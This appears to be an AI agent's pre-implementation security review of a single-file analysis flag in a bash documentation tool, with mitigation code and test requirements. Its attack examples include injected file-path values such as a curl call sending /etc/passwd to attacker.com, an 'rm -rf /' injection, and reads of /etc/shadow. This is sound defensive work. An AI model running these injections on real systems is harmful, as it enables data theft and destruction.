# Security Review: Feature 0051 - Single-File Analysis Mode

**Feature ID**: feature_0051_single_file_analysis  
**Review Date**: 2026-02-14  
**Reviewer**: Security Review Agent  
**Status**: Pre-Implementation Review  
**Risk Level**: HIGH

## Executive Summary

Feature 0051 introduces single-file analysis mode via CLI flag `-f <file>`. This feature presents **HIGH security risk** due to potential path traversal (CWE-22), symlink attacks (CWE-59), and file type validation vulnerabilities. This review provides mandatory security requirements that MUST be implemented before the Developer Agent proceeds.

## Feature Overview

**Purpose**: Allow users to analyze a single file instead of an entire directory.

**Implementation Components**:
- CLI flag handling for `-f <file>` or `--file <file>`
- File existence and type validation
- Path canonicalization and traversal prevention
- MIME type detection for single file
- Plugin execution on single file
- Result generation in workspace

## Critical Security Vulnerabilities (MUST FIX)

### 1. Path Traversal (CWE-22) - CRITICAL

**Risk Level**: CRITICAL  
**CVSS 3.1 Score**: 7.5 (High)  
**Attack Vector**: User provides malicious file path

**Vulnerability Description**:
```bash
# Attack examples:
./doc.doc.sh -f "../../../etc/passwd" -w workspace/
./doc.doc.sh -f "/etc/shadow" -w workspace/
./doc.doc.sh -f "../../sensitive_project/secret.key" -w workspace/
./doc.doc.sh -f "/dev/null" -w workspace/
```

**Impact**:
- Unauthorized read access to system files
- Analysis of sensitive files outside intended scope
- Information disclosure via plugin processing
- Potential exposure of credentials, keys, or confidential data

**Mandatory Controls**:

1. **Path Canonicalization** - MUST implement:
```bash
# Canonicalize path using realpath or readlink -f
validate_single_file_path() {
  local file_path="$1"
  local canonical_path
  
  # Canonicalize path (resolves .., symlinks, etc.)
  canonical_path=$(realpath "$file_path" 2>/dev/null) || {
    log "ERROR" "SECURITY" "Cannot resolve file path: $file_path"
    return 1
  }
  
  # MUST exist
  if [[ ! -e "$canonical_path" ]]; then
    log "ERROR" "File does not exist: $file_path"
    return 1
  fi
  
  # MUST be regular file (not directory, device, FIFO, socket)
  if [[ ! -f "$canonical_path" ]]; then
    log "ERROR" "Not a regular file: $file_path"
    return 1
  fi
  
  # Store canonicalized path for later use
  echo "$canonical_path"
  return 0
}
```

2. **Reject Absolute Paths Outside User's Control** (Optional Enhancement):
```bash
# Optional: Restrict to current working directory tree
if [[ "$canonical_path" != "$PWD"* ]]; then
  log "WARN" "SECURITY" "File outside current directory: $canonical_path"
  # Prompt user or apply additional validation
fi
```

3. **Test Coverage Required**:
- `../../../etc/passwd` - MUST reject or canonicalize safely
- `/absolute/path/to/file` - MUST handle appropriately
- `./relative/path/../../../etc/passwd` - MUST canonicalize and validate
- Symlinks pointing outside user directories - MUST validate target
- Non-existent files - MUST reject with clear error
- Files with special characters: spaces, quotes, null bytes

### 2. Symlink Attacks (CWE-59) - HIGH

**Risk Level**: HIGH  
**CVSS 3.1 Score**: 6.5 (Medium)  
**Attack Vector**: Malicious symlink creation

**Vulnerability Description**:
```bash
# Attack scenario:
ln -s /etc/passwd ~/myproject/innocent_file.txt
./doc.doc.sh -f ~/myproject/innocent_file.txt -w workspace/

# Time-of-check-time-of-use (TOCTOU):
# User creates legitimate file, script validates it
# User swaps with symlink before script reads it
# Script reads unauthorized file
```

**Impact**:
- Read access to files user didn't intend to analyze
- TOCTOU race conditions
- Information disclosure through plugin analysis
- Bypass of access controls

**Mandatory Controls**:

1. **Symlink Target Validation** - Leverage existing `validate_file_type()`:
```bash
# Already exists in workspace_security.sh (lines 224-234)
# MUST be called before file processing
if ! validate_file_type "$canonical_file_path"; then
  log "ERROR" "SECURITY" "File type validation failed: $file_path"
  exit 1
fi
```

2. **Follow Symlinks Explicitly** - Use realpath/readlink:
```bash
# Canonicalization resolves symlinks - use result, not original path
if [[ -L "$user_provided_path" ]]; then
  log "INFO" "Following symlink: $user_provided_path -> $canonical_path"
fi
```

3. **Test Coverage Required**:
- Symlink to file in same directory - MUST follow and validate
- Symlink to `/etc/passwd` - MUST validate target is appropriate
- Symlink to device file (`/dev/random`) - MUST reject (special file)
- Circular symlinks - MUST handle without infinite loop
- Broken symlinks - MUST reject with clear error
- TOCTOU scenario - Document limitation or implement atomic check

### 3. Special File Types (CWE-434, CWE-67) - HIGH

**Risk Level**: HIGH  
**CVSS 3.1 Score**: 6.0 (Medium)  
**Attack Vector**: User provides device/FIFO/socket path

**Vulnerability Description**:
```bash
# Attack examples:
./doc.doc.sh -f /dev/random -w workspace/    # Read infinite random data
./doc.doc.sh -f /dev/zero -w workspace/      # Read infinite zeros
mkfifo /tmp/my_fifo && ./doc.doc.sh -f /tmp/my_fifo  # Block forever
./doc.doc.sh -f /var/run/docker.sock -w workspace/   # Access Docker socket
```

**Impact**:
- Denial of Service (hang on FIFO/socket read)
- Resource exhaustion (infinite reads from `/dev/random`)
- Unauthorized access to system resources (sockets)
- Potential privilege escalation via special devices

**Mandatory Controls**:

1. **File Type Validation** - MUST reject special files:
```bash
# validate_file_type() in workspace_security.sh already implements this (lines 200-237)
# Rejects:
# - Character devices (-c): /dev/tty, /dev/random
# - Block devices (-b): /dev/sda
# - Named pipes (-p): FIFOs
# - Sockets (-S): Unix domain sockets
# - Directories (-d): Must use -d flag instead

# MUST call before processing:
if ! validate_file_type "$canonical_file_path"; then
  log "ERROR" "SECURITY" "Invalid file type for single-file analysis"
  exit 1
fi
```

2. **File Size Validation** - Already in `validate_file_type()`:
```bash
# Enforces MAX_FILE_SIZE (default 100 MB)
# Prevents resource exhaustion from large files
```

3. **Test Coverage Required** (from test suite):
- Regular file (`.txt`, `.md`, `.json`, `.sh`) - MUST accept
- Directory - MUST reject with error
- Character device (`/dev/null`) - MUST reject
- Block device (`/dev/sda`) - Test in isolation, MUST reject
- Named pipe (FIFO) - MUST reject
- Unix socket - MUST reject
- Empty file (0 bytes) - MUST accept (test 22)
- Large file (>100MB) - Document behavior (reject or handle)

### 4. Input Validation - Command Injection (CWE-78) - CRITICAL

**Risk Level**: CRITICAL  
**CVSS 3.1 Score**: 9.0 (Critical)  
**Attack Vector**: Shell metacharacters in file path

**Vulnerability Description**:
```bash
# Attack examples (if improperly quoted):
./doc.doc.sh -f '$(whoami)' -w workspace/
./doc.doc.sh -f '; rm -rf / #' -w workspace/
./doc.doc.sh -f 'file.txt; curl attacker.com?data=$(cat /etc/passwd)' -w workspace/
```

**Impact**:
- Arbitrary command execution
- System compromise
- Data exfiltration
- Privilege escalation

**Mandatory Controls**:

1. **Always Quote Variables** - Shell injection prevention:
```bash
# CORRECT - Always quote:
if [[ -f "$file_path" ]]; then
  canonical_path=$(realpath "$file_path")
  validate_file_type "$canonical_path"
  process_file "$canonical_path"
fi

# INCORRECT - Never do this:
if [[ -f $file_path ]]; then  # VULNERABLE
  eval "process $file_path"   # EXTREMELY VULNERABLE
fi
```

2. **Reject Null Bytes and Control Characters**:
```bash
# Check for dangerous characters
if [[ "$file_path" == *$'\0'* ]] || [[ "$file_path" =~ [[:cntrl:]] ]]; then
  log "ERROR" "SECURITY" "File path contains invalid characters"
  return 1
fi
```

3. **Use Bash Parameter Validation**:
```bash
# Validate argument was provided
if [[ -z "${file_path:-}" ]]; then
  log "ERROR" "File path not provided for -f flag"
  exit 1
fi
```

4. **Test Coverage Required**:
- File path with spaces - MUST handle correctly
- File path with single quotes - MUST handle
- File path with double quotes - MUST handle
- File path with shell metacharacters `$()` - MUST sanitize/reject
- File path with semicolons - MUST not execute as command
- File path with null byte - MUST reject
- File path with newlines - MUST reject

### 5. Error Handling - Information Disclosure (CWE-209) - MEDIUM

**Risk Level**: MEDIUM  
**CVSS 3.1 Score**: 4.0 (Medium)  
**Attack Vector**: Error messages reveal sensitive paths

**Vulnerability Description**:
```bash
# Attacker uses error messages to map filesystem:
./doc.doc.sh -f /etc/passwd
# ERROR: File outside source directory: /etc/passwd
# ^ Attacker learns /etc/passwd exists

./doc.doc.sh -f /home/admin/.ssh/id_rsa
# ERROR: Permission denied: /home/admin/.ssh/id_rsa
# ^ Attacker learns admin user has SSH keys
```

**Impact**:
- Information disclosure about filesystem structure
- Exposure of sensitive paths
- Aids reconnaissance for further attacks
- Privacy violation

**Mandatory Controls**:

1. **Sanitize Error Messages**:
```bash
# GOOD - Generic error without revealing details:
log "ERROR" "File cannot be accessed"

# ACCEPTABLE - Log details securely:
log "ERROR" "File validation failed: $file_path"
log_secure "DEBUG" "SECURITY" "Full path: $canonical_path, reason: $error_detail"

# BAD - Reveals too much:
echo "ERROR: Cannot access /etc/passwd - permission denied" >&2
```

2. **Use Different Error Messages for Different Audiences**:
```bash
# User-facing (stdout/stderr):
"ERROR: File not accessible. Check path and permissions."

# Secure log (file, restricted access):
"ERROR: File validation failed: /etc/passwd, reason: outside source directory"
```

3. **Test Coverage Required**:
- Non-existent file error - MUST NOT reveal full system paths
- Permission denied error - MUST be generic
- Directory instead of file - MUST NOT reveal full path unnecessarily
- Special file error - MUST NOT reveal system structure

### 6. Plugin Execution Security (CWE-426, CWE-494) - HIGH

**Risk Level**: HIGH  
**CVSS 3.1 Score**: 6.5 (Medium)  
**Attack Vector**: Malicious plugins process arbitrary file

**Vulnerability Description**:
- Single-file mode bypasses directory context validation
- Plugins might not expect arbitrary system files as input
- Malicious file content could exploit plugin vulnerabilities
- No sandboxing of plugin execution environment

**Impact**:
- Plugin crashes or hangs on unexpected input
- Exploitation of plugin parsing vulnerabilities
- Information leakage through plugin side channels
- Compromise of workspace integrity

**Mandatory Controls**:

1. **Apply Existing Plugin Security** - Reuse plugin_executor.sh:
```bash
# MUST use existing plugin execution with all security controls:
# - Plugin validation (descriptor.json checks)
# - Resource limits (timeouts, ulimits)
# - Output validation (JSON schema checks)
# - Error handling (isolated failures)

# Ensure single-file mode uses same controls as directory mode
```

2. **Pass Canonicalized Paths to Plugins**:
```bash
# ALWAYS pass validated, canonical path:
execute_plugin "$plugin_name" "$canonical_file_path" "$workspace_dir"

# NEVER pass user input directly:
# execute_plugin "$plugin_name" "$user_input"  # VULNERABLE
```

3. **Validate Plugin Outputs**:
```bash
# Existing validation in plugin_executor.sh should apply
# Ensure plugin cannot write outside workspace
# Validate JSON output format
```

4. **Test Coverage Required** (from test suite):
- Active plugins execute on single file (test 13) - MUST work
- Inactive plugins DO NOT execute (test 14) - MUST enforce
- Plugin respects file type filters (test 15) - MUST honor MIME types
- Plugin errors don't crash application - MUST isolate
- Malformed plugin output - MUST handle gracefully

## Security Requirements (MUST Implement)

### Requirement SEC-0051-001: Path Validation (CRITICAL)
**Priority**: CRITICAL  
**Status**: Required  

**Specification**:
- MUST canonicalize all file paths using `realpath` or `readlink -f`
- MUST validate canonicalized path refers to regular file
- MUST reject paths to special files (devices, FIFOs, sockets, directories)
- MUST handle symlinks by validating final target
- MUST reject non-existent files with clear error

**Implementation**:
```bash
# Create validate_single_file_input() function
# Call before any file operations
# Return canonical path on success, exit 1 on failure
```

**Test Coverage**:
- Unit tests for path traversal attempts
- Unit tests for symlink resolution
- Unit tests for special file rejection
- Integration test with malicious path inputs

### Requirement SEC-0051-002: Input Sanitization (CRITICAL)
**Priority**: CRITICAL  
**Status**: Required  

**Specification**:
- MUST quote all file path variables in Bash code
- MUST reject file paths with null bytes
- MUST reject file paths with control characters (optional for newlines)
- MUST NOT use `eval` or unquoted command substitution with user input
- MUST validate argument exists before use

**Implementation**:
```bash
# Always use "$file_path" not $file_path
# Validate with [[ $file_path =~ ^[[:print:]]+$ ]]
# Check for null bytes before processing
```

**Test Coverage**:
- Shell injection attempts with metacharacters
- Null byte injection tests
- Control character tests

### Requirement SEC-0051-003: Error Message Sanitization (MEDIUM)
**Priority**: MEDIUM  
**Status**: Recommended  

**Specification**:
- SHOULD use generic error messages for user-facing output
- MAY log detailed errors securely (file or debug stream)
- MUST NOT reveal full system paths in error messages
- MUST NOT reveal existence of files user shouldn't access

**Implementation**:
```bash
# User error: "File cannot be accessed"
# Secure log: "File validation failed: /etc/passwd"
```

**Test Coverage**:
- Error message inspection for sensitive data
- Verify secure logging works correctly

### Requirement SEC-0051-004: File Type Validation (HIGH)
**Priority**: HIGH  
**Status**: Required  

**Specification**:
- MUST call existing `validate_file_type()` before processing
- MUST reject character devices, block devices, FIFOs, sockets
- MUST enforce file size limits (MAX_FILE_SIZE)
- MUST handle empty files gracefully (0 bytes)

**Implementation**:
```bash
# Use workspace_security.sh::validate_file_type()
if ! validate_file_type "$canonical_path"; then
  exit 1
fi
```

**Test Coverage**:
- All special file types from test suite (tests 7, 22, 23)
- Size limit enforcement

### Requirement SEC-0051-005: Plugin Execution Security (HIGH)
**Priority**: HIGH  
**Status**: Required  

**Specification**:
- MUST use existing plugin_executor.sh with all controls
- MUST pass only canonical, validated paths to plugins
- MUST apply resource limits (timeouts, memory)
- MUST validate plugin outputs
- MUST isolate plugin failures

**Implementation**:
```bash
# Reuse orchestration/plugin_executor.sh functions
# No new plugin execution paths
```

**Test Coverage**:
- Plugin execution tests (13-21 from test suite)
- Plugin failure isolation
- Resource limit enforcement

### Requirement SEC-0051-006: Workspace Integration (MEDIUM)
**Priority**: MEDIUM  
**Status**: Required  

**Specification**:
- MUST create workspace structure for single-file analysis
- MUST enforce workspace isolation (no writes outside)
- MUST apply workspace security verification
- MUST NOT scan sibling files (test 27)

**Implementation**:
```bash
# Create minimal workspace for single file
# Apply existing workspace_security.sh controls
```

**Test Coverage**:
- Workspace creation tests (28-30)
- Sibling file isolation test (27)
- Workspace permission verification

## Implementation Recommendations

### 1. Argument Parsing

**Location**: `scripts/components/ui/argument_parser.sh`

**Implementation**:
```bash
# Add to argument parser:
-f|--file)
  if [[ -z "${2:-}" ]]; then
    log "ERROR" "Option -f requires file path argument"
    exit 1
  fi
  SINGLE_FILE_MODE=true
  SINGLE_FILE_PATH="$2"
  shift 2
  ;;
```

### 2. File Validation Function

**Location**: `scripts/components/orchestration/workspace_security.sh` (add new function)

**Implementation**:
```bash
# Add to workspace_security.sh:

# Validate single file input for security
# Arguments:
#   $1 - User-provided file path
# Returns:
#   0 on success (prints canonical path to stdout)
#   1 on failure
# Exports: None
validate_single_file_input() {
  local user_path="$1"
  local canonical_path
  
  # Check for dangerous characters
  if [[ "$user_path" == *$'\0'* ]]; then
    log "ERROR" "SECURITY" "File path contains null byte"
    return 1
  fi
  
  # Canonicalize path
  canonical_path=$(realpath "$user_path" 2>/dev/null) || {
    log "ERROR" "Cannot resolve file path (file may not exist)"
    return 1
  }
  
  # Validate file type (calls existing function)
  if ! validate_file_type "$canonical_path"; then
    return 1
  fi
  
  # Success - output canonical path
  echo "$canonical_path"
  return 0
}
```

### 3. Main Orchestrator Integration

**Location**: `scripts/components/orchestration/main_orchestrator.sh`

**Implementation**:
```bash
# Add to main_orchestrator.sh:

# Orchestrate single-file analysis
# Arguments:
#   $1 - Validated canonical file path
#   $2 - Workspace directory
#   $3 - Plugins directory
# Returns: 0 on success, 1 on failure
orchestrate_single_file_analysis() {
  local file_path="$1"
  local workspace_dir="$2"
  local plugins_dir="$3"
  
  log "INFO" "Starting single-file analysis: $(basename "$file_path")"
  
  # Initialize workspace
  initialize_workspace "$workspace_dir" || return 1
  
  # Verify workspace security
  verify_workspace_integrity "$workspace_dir" || return 1
  
  # Detect MIME type
  local mime_type
  mime_type=$(detect_mime_type "$file_path")
  log "INFO" "Detected MIME type: $mime_type"
  
  # Discover plugins
  local -a active_plugins
  discover_active_plugins "$plugins_dir" active_plugins
  
  # Execute plugins on single file
  for plugin in "${active_plugins[@]}"; do
    execute_plugin_on_file "$plugin" "$file_path" "$mime_type" "$workspace_dir"
  done
  
  # Generate report
  generate_single_file_report "$file_path" "$workspace_dir"
  
  log "INFO" "Single-file analysis complete"
  return 0
}
```

### 4. Entry Point Logic

**Location**: `scripts/doc.doc.sh`

**Implementation**:
```bash
# Add to main workflow in doc.doc.sh:

run_analysis() {
  local plugins_dir="${SCRIPT_DIR}/plugins/${PLATFORM}"
  
  # Check if single-file mode
  if [[ "${SINGLE_FILE_MODE:-false}" == "true" ]]; then
    # Validate single file input (security critical)
    local canonical_file
    canonical_file=$(validate_single_file_input "$SINGLE_FILE_PATH") || {
      log "ERROR" "File validation failed"
      exit 1
    }
    
    log "INFO" "Single-file mode: $canonical_file"
    
    # Orchestrate single-file analysis
    orchestrate_single_file_analysis \
      "$canonical_file" \
      "$WORKSPACE_DIR" \
      "$plugins_dir" || exit 1
  else
    # Existing directory analysis
    orchestrate_directory_analysis \
      "$SOURCE_DIR" \
      "$WORKSPACE_DIR" \
      "$plugins_dir" || exit 1
  fi
  
  return 0
}
```

## Testing Requirements

### Security Test Cases (MUST Pass)

1. **Path Traversal Prevention**:
   - `../../../etc/passwd` - Reject or canonicalize safely
   - `/absolute/system/path` - Validate appropriately
   - Relative paths with `..` - Canonicalize correctly

2. **Symlink Attack Prevention**:
   - Symlink to `/etc/passwd` - Validate target
   - Symlink to device file - Reject special file type
   - Broken symlink - Reject with error
   - Circular symlink - Handle without hanging

3. **Special File Rejection**:
   - `/dev/null` - Reject
   - `/dev/random` - Reject
   - FIFO (named pipe) - Reject
   - Unix socket - Reject
   - Directory - Reject with clear error

4. **Command Injection Prevention**:
   - File path with `$(command)` - Sanitize/handle safely
   - File path with `;` - Not interpreted as command
   - File path with spaces - Handle correctly
   - File path with quotes - Handle correctly

5. **Error Message Security**:
   - Non-existent file error - Don't reveal full paths
   - Permission denied - Generic message
   - Special file error - Don't reveal system structure

6. **Plugin Execution Security**:
   - Active plugins execute (test 13)
   - Inactive plugins don't execute (test 14)
   - Plugin errors isolated (no crash)
   - Resource limits enforced

### Integration Tests

Run full test suite: `tests/unit/test_single_file_analysis.sh`
- All 30 tests MUST pass
- No security failures in error cases
- No information leaks in verbose mode

## Risk Assessment Summary

| Vulnerability | CWE | Risk Level | CVSS | Mitigation Priority |
|--------------|-----|------------|------|-------------------|
| Path Traversal | CWE-22 | CRITICAL | 7.5 | CRITICAL |
| Symlink Attacks | CWE-59 | HIGH | 6.5 | HIGH |
| Special File Types | CWE-434 | HIGH | 6.0 | HIGH |
| Command Injection | CWE-78 | CRITICAL | 9.0 | CRITICAL |
| Information Disclosure | CWE-209 | MEDIUM | 4.0 | MEDIUM |
| Plugin Execution | CWE-426 | HIGH | 6.5 | HIGH |

**Overall Risk**: HIGH  
**Mitigation Status**: Mitigations REQUIRED before implementation  
**Approval Status**: ⚠️ **CONDITIONAL** - Implement all CRITICAL and HIGH controls

## Approval and Sign-Off

**Security Review Status**: ✅ **APPROVED WITH CONDITIONS**

**Conditions for Implementation**:
1. ✅ MUST implement SEC-0051-001 (Path Validation)
2. ✅ MUST implement SEC-0051-002 (Input Sanitization)
3. ✅ MUST implement SEC-0051-004 (File Type Validation)
4. ✅ MUST implement SEC-0051-005 (Plugin Execution Security)
5. ✅ MUST implement SEC-0051-006 (Workspace Integration)
6. ⚠️ SHOULD implement SEC-0051-003 (Error Message Sanitization)

**Additional Requirements**:
- All CRITICAL and HIGH priority requirements MUST be implemented
- Security test suite MUST pass before merge
- Code review MUST verify proper variable quoting
- ShellCheck MUST pass with no security warnings

**Developer Agent**: You may proceed with implementation following these security requirements. All CRITICAL and HIGH controls are mandatory. Re-review after implementation before merge.

## References

### Related Security Documentation
- `01_vision/04_security/02_scopes/02_runtime_application_security.md`
- `scripts/components/orchestration/workspace_security.sh`

### CWE References
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-59: Improper Link Resolution](https://cwe.mitre.org/data/definitions/59.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-209: Information Exposure Through Error Messages](https://cwe.mitre.org/data/definitions/209.html)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [CWE-426: Untrusted Search Path](https://cwe.mitre.org/data/definitions/426.html)

### OWASP References
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)

## Document History
- [2026-02-14] Initial security review completed for Feature 0051
- [2026-02-14] Identified 6 critical security vulnerabilities
- [2026-02-14] Defined 6 security requirements (5 required, 1 recommended)
- [2026-02-14] Approved with conditions for Developer Agent implementation
